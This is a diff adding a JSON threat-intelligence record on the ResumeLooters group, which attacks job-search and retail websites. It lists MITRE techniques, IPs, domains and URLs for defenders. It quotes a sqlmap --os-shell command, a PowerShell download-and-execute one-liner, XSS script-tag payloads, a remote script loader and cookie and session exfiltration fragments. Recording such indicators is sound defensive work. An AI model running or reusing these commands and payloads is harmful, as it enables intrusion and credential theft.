@@ -1,0 +1,379 @@
+{
+  "malware_family": "ResumeLooters",
+  "threat_actor": "ResumeLooters",
+  "platforms": [
+    "web",
+    "windows"
+  ],
+  "summary": "ResumeLooters is a threat group active since early 2023, targeting job search and retail websites, primarily in the APAC region. They use SQL injection to steal user databases and XSS to inject malicious scripts aiming to steal credentials. The group utilizes a variety of publicly available penetration testing tools and sells stolen data on Telegram.",
+  "mitre_techniques": [
+    "T1595.002",
+    "T1595.003",
+    "T1583.001",
+    "T1583.004",
+    "T1189",
+    "T1190",
+    "T1059.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "python3 sqlmap.py -r txt/redacted.txt -p employee_id --risk 3 --level 3 --batch -D app -T auth_user --os-shell",
+      "context": "Command used to gain shell access on a target system.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "sqlmap",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://139.84.130.232:8080/CcrN3QqWOeRx/KAGctYUci'));IEX ((new-object Net.WebClient).DownloadString('http://139.84.130.232:8080/CcrN3QqWOeRx/iDDHJOuzw/1'));IEX ((new-object Net.WebClient).DownloadString('http://139.84.130.232:8080/CcrN3QqWOeRx'));",
+      "context": "Executed via sqlmap --os-shell to download and run additional payloads.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "<script/src=//8r.ae></script>",
+      "context": "Malicious XSS script injected into web forms and fake profiles.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "<ScRiPt/sRc=//sb8.co></sCriPt>",
+      "context": "Malicious script tag on attacker-controlled page to load further scripts.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "javascript:eval('var a=document.createElement('script');a.src='https://sb8.co/online.htm';document.body.appendChild(a)')",
+      "context": "Script loader found on the root page of sb8.co.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "notice=\" + notice + \"&localStorage=\" + localstorages + \"&sessionStorage=\" + sessionStorages + \"&html=\" + htmls + \"&img=\" + img",
+      "context": "Data exfiltration POST body format from online.htm.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "HOST=\" + url + \"?cook=\" + cookie",
+      "context": "Data exfiltration POST body format from if.js.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "domain+\" xss执行iframe弹窗成功n\" + \"URL:\" + window.location.href",
+      "context": "Success notification message sent by if.js script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "width:100%;height:100%;z-index:99999;position:fixed;top:0px;border:0;frameborder:no;allowTransparency:true;background:white;scrolling:no",
+      "context": "CSS style for hidden iframe used in phishing attacks.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "time_one",
+      "context": "Key used in localStorage by if.js to track phishing state.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "jobsgo100953312597",
+      "context": "Value stored in localStorage by if.js to track phishing state.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "jobsgo100953312598",
+      "context": "Value stored in localStorage by if.js to track phishing state.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "jobsgo100953312599",
+      "context": "Value stored in localStorage by if.js to track phishing state.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "my_iframe",
+      "context": "ID attribute of the phishing iframe created by if.js.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "shell3.exe",
+      "context": "Payload executable downloaded from attacker server.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "AdminJobApprovalGrid.aspx_2023_11_23_02_02_39.html",
+      "context": "Stolen file found on attacker's server, indicating compromised admin page.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "渗透数据中心",
+      "context": "Attacker's Telegram account name, translates to \"Penetration Data Center\".",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "万国数据阿力",
+      "context": "Attacker's Telegram account name, translates to \"World Data Ali\".",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "1757750719",
+      "context": "Telegram user ID associated with attacker accounts.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "5833110993",
+      "context": "Telegram user ID associated with attacker accounts.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "139.180.137.107",
+      "context": "Malicious server hosting scripts and phishing pages.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "139.84.130.232",
+      "context": "Server used to host additional payloads.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "139.84.168.189",
+      "context": "Server hosting Acunetix and Beef Framework.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "admin.cloudnetsofe.com",
+      "context": "Primary C2 and phishing domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "sb8.co",
+      "context": "Domain hosting malicious JavaScript files.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "qu3.cc",
+      "context": "Domain of exfiltration server (api.qu3.cc).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "8r.ae",
+      "context": "Domain hosting malicious XSS script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "8t.ae",
+      "context": "Malicious domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "3x1.me",
+      "context": "Malicious domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "7o.ae",
+      "context": "Malicious domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "9gp.cc",
+      "context": "Malicious domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://139.84.130.232:8080/CcrN3QqWOeRx/KAGctYUci",
+      "context": "Payload URL downloaded by PowerShell.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://139.84.130.232:8080/CcrN3QqWOeRx/iDDHJOuzw/1",
+      "context": "Payload URL downloaded by PowerShell.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://139.180.137.107:9932/shell3.exe",
+      "context": "Payload download URL.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://139.84.168.189:3000/jquery.js",
+      "context": "Malicious script identified as part of the Beef Framework.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Beef Framework"
+    },
+    {
+      "kind": "url",
+      "value": "https://sb8.co/online.htm",
+      "context": "Malicious script for screenshotting and data exfiltration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://admin.cloudnetsofe.com/if.js",
+      "context": "Malicious script to create phishing iframes and exfiltrate data.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://api.qu3.cc/?js=sb8.co",
+      "context": "Exfiltration endpoint for screenshots and session data.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/domainxxdisdiiskshfdsh.php",
+      "context": "Exfiltration endpoint for URL and cookie data.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
